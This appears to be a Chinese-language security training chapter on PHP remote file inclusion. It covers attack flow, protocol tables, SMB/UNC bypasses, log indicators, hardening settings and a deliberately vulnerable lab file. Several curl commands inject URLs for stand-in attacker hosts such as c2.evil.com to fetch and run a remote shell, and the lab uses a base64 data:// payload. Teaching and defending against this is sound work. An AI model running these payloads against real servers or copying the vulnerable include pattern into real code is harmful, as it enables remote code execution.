# R11.4 遠端檔案包含與跨網路資源信任機制分析 (Remote File Inclusion & Cross-Network Resource Trust)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**遠端檔案包含 (Remote File Inclusion, RFI)** 發生於伺服器端直譯引擎動態載入外部網路資源並直接送入直譯環境執行時。其本質為：**「直譯器（如 PHP）跨越網路邊界主動拉取外部不可信代碼並在特權進程中編譯執行；攻擊者無須依賴受害者本機檔案或日誌投毒，即可直接透過外部託管伺服器向目標輸送惡意指令奪取 Shell」**。

```
[攻擊者] ── 1. GET /index.php?page=http://c2.evil.com/shell.txt ──► [Web 伺服器]
                                                                        │
                                                                        ▼ 呼叫 include($page)
                                                             [直譯器 VFS 串流解析]
                                                                        │
                                                                        ├── 檢驗 allow_url_include
                                                                        ▼ 向外部發起 HTTP/SMB 請求
                                                             [攻擊者 C2 伺服器]
                                                                        │
                                                                        ▼ 2. 回傳純文字 PHP 代碼
[攻擊者控制台] ◄── 3. 目標伺服器本地編譯執行 ➔ 取得 WebShell ──────────┘
```

### 核心作戰決策與邊界
- **必要環境前提**：
  - PHP 環境中通常需要 `allow_url_include = On` 與 `allow_url_fopen = On`。
  - 若目標為 Windows Server，即便 `allow_url_include = Off`，依然可利用 **SMB/UNC 路徑 (`\\c2-ip\share\shell.php`)** 繞過 URL 包含限制。
- **作戰決策心流**：
  1. **測試標準 HTTP 包含**：注入 `http://c2/shell.txt`；若有後綴拼接（如 `.php`），使用 `?` 截斷（`http://c2/shell.txt?`）。
  2. **Windows SMB 降級打擊**：若 HTTP 被阻斷，切換為 UNC 格式 `\\c2-ip\web\shell.php`。
- **技術邊界**：
  - **與 SSRF (R11.1) 差異**：SSRF 是伺服器發起網路請求並回傳資料；RFI 會將獲取的遠端資料**送入直譯引擎執行**。

## 🔬 第一動：底層機制與跨網路串流解析 (Mechanics & Protocols)

### 串流協定解析與環境限制速查表

| 載入方式 | 典型語法範例 | 底層行為與繞過原理 | 必要配置需求 |
| :--- | :--- | :--- | :--- |
| **HTTP/HTTPS RFI** | `http://c2.evil.com/shell.txt` | 串流層發起 HTTP GET 拉取遠端代碼並執行 | `allow_url_include = On` |
| **Windows SMB/UNC** | `\\c2.evil.com\share\shell.php` | Windows 將其視為本地檔案系統調用，繞過 URL 檢查 | `allow_url_include = Off` 仍可運作！ |
| **Data 協定內聯** | `data://text/plain;base64,PD9wa...` | 將 Base64 直接解碼為串流送入直譯器執行 | `allow_url_include = On` |
| **FTP 包含** | `ftp://c2.example.com/shell.txt` | 透過 FTP 協定拉取腳本執行 | `allow_url_include = On` |

## ⚡ 第二動：弱點驗證與字典級攻擊向量 (Attack Vectors)

### 核心注入向量速查表

#### 1. 標準 HTTP 包含與查詢字串截斷
- 若代碼直接包含：`include($_GET['page']);`
  ```bash
  curl -s "http://target.internal/index.php?page=http://c2.evil.com/shell.txt"
  ```
- 若代碼硬編碼後綴：`include($_GET['page'] . ".php");`
  ```bash
  # 利用問號 ? 將 .php 轉為遠端 C2 伺服器的無效 Query 參數
  curl -s "http://target.internal/index.php?page=http://c2.evil.com/shell.txt?"
  ```

#### 2. Windows 環境 SMB / UNC 繞過打擊
在 Windows + PHP 架構中，即便 `allow_url_include = Off`：
```bash
# 攻擊者架設公開匿名 SMB 共享 (Samba / Impacket smbserver)
curl -s "http://windows-target.internal/index.php?page=\\\\attacker-c2.com\\share\\shell.php"
```

## 🥷 第三動：防禦規避與日誌鑑識特徵 (Evasion & Telemetry)

- **後綴拼接規避**：
  - URL Query 截斷：`http://c2/shell.txt?` ➔ 遠端收到請求為 `GET /shell.txt?.php`，依然回傳 `shell.txt`。
  - URL Fragment 截斷：`http://c2/shell.txt#` ➔ 伺服器忽略 `#` 之後的字串。
- **鑑識特徵**：
  - **日誌特徵**：Web 存取日誌中參數開頭出現 `http://`、`https://`、或 UNC 路徑 `\\`。
  - **異常出站流量**：Web 伺服器向外部未知公網 IP 發起非預期的 HTTP (80/443) 或 SMB (445) 網路連線。

## ⚔️ 第四動：紅藍攻防對抗矩陣 (Red vs. Blue Confrontation Matrix)

| 攻擊模式 (Offense) | 藍隊遙測指標 (Blue Telemetry) | 防禦基線反制 (Mitigation Baseline) | 繞過與殘餘考量 (Residual Seam) |
| :--- | :--- | :--- | :--- |
| **HTTP 遠端包含** | Web 日誌中參數包含外部 URL 特徵 | php.ini 強制關閉 `allow_url_include = Off` | Windows 下轉向利用 SMB/UNC 路徑 |
| **Windows SMB 包含** | Egress 偵測到向外網發起 TCP 445 出站連線 | 主機層邊界防火牆全面封鎖出站 TCP 445 連線 | 尋找內網已失陷主機作為中繼 SMB 伺服器 |
| **Query 截斷繞過** | URL 參數結尾帶有 `?` 或 `%23` | 嚴格使用靜態白名單查表，禁止動態拼接 | 尋找未套用白名單之次要動態載入端點 |
| **Data 協定注入** | 請求參數中出現 `data://` 特徵碼 | 停用 `allow_url_include` 與 `allow_url_fopen` | 降級為利用本地日誌或 Session 進行 LFI |

## 🛡️ 第五動：安全加固與修復基線 (Hardening & Remediation Baseline)

### 1. PHP 全域環境安全配置 (php.ini)
```ini
; 徹底禁止將 URL 作為檔案包含的參數（預設即為 Off）
allow_url_include = Off

; 禁止將 URL 作為 fopen 參數（若業務無需遠端讀檔）
allow_url_fopen = Off
```

### 2. 網路邊界與架構加固
- **網路層 Egress 防護**：在雲端安全性群組 (Security Group) 或防火牆上，**全面封殺伺服器向外網發起的 TCP 445 (SMB) 連線**，徹底瓦解 UNC 路徑包含與 NTLM 憑證竊取攻擊。
- **代碼層靜態查表**：嚴格實施白名單字典映射，禁止將使用者輸入作為檔案定位符。

## 🧪 實戰演練環境導引 (Hands-on Range Lab Walkthrough)

### 1. 靶場核心代碼 (`rfi_lab.php`，極簡 15 行)
```php
<?php
// 需配置 allow_url_include = On 進行測試
$page = $_GET['module'] ?? 'home.php';

if (isset($_GET['safe'])) {
    // 加固：拒絕包含協議前綴與 UNC 路徑
    if (preg_match('/^(https?|ftp|data|php):|\/\//i', $page) || str_starts_with($page, '\\\\')) {
        die("Security Alert: Remote File Inclusion Blocked");
    }
}

// 缺陷端點
include($page);
?>
```

### 2. 三步驗證流程

1. **本機模擬遠端包含**：
   ```bash
   # 模擬載入遠端腳本
   curl -s "http://127.0.0.1:8114/rfi_lab.php?module=data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1BXTkVEJzsgPz4="
   # 回顯: RFI_PWNED (證實遠端代碼被執行)
   ```
2. **驗證加固端點**：
   ```bash
   curl -s "http://127.0.0.1:8114/rfi_lab.php?safe=1&module=data://text/plain;base64,PD9waHAgZWNobyAnUkZJX1BXTkVEJzsgPz4="
   # 回顯: Security Alert: Remote File Inclusion Blocked，加固生效！
   ```

## 🎯 作戰驗收檢查點 (Mastery Checklist)

- [ ] **Q1. 遠端檔案包含 (RFI) 成立的兩個最核心 PHP 配置是什麼？**  
  *分析思路*：必須同時開啟 `allow_url_fopen = On`（允許開啟 URL 串流）與 `allow_url_include = On`（允許將 URL 串流送入 include/require 執行）。

- [ ] **Q2. 為什麼在 Windows 伺服器上即使關閉了 `allow_url_include`，依然可能遭受 RFI 攻擊？**  
  *分析思路*：Windows 支援 SMB/UNC 網路路徑（`\\host\share\file`）；PHP 虛擬檔案系統將 UNC 路徑視為本機檔案系統調用而非 URL，不受 `allow_url_include` 開關約束。

- [ ] **Q3. 後端代碼若強制拼接 `.php` 後綴，攻擊者如何透過 URL 語意進行截斷？**  
  *分析思路*：在注入的遠端 URL 尾端加上 `?` 或 `#`（例如 `http://c2/shell.txt?`）；當後端拼接 `.php` 時，變成 `http://c2/shell.txt?.php`，遠端 Web 伺服器將其視為 Query 參數，依然回傳 `shell.txt` 本體。

- [ ] **Q4. 企業網路層防禦 Windows SMB 包含攻擊最關鍵的控制項是什麼？**  
  *分析思路*：在邊界防火牆全面阻斷伺服器對外網的 TCP 445 (SMB) 連線，使伺服器無法向外網惡意主機掛載共享目錄。

- [ ] **Q5. 徹底杜絕 RFI 漏洞的根本解法是什麼？**  
  *分析思路*：全域停用 `allow_url_include`，並在代碼層廢除動態檔案包含，採用嚴格的白名單靜態字典映射。
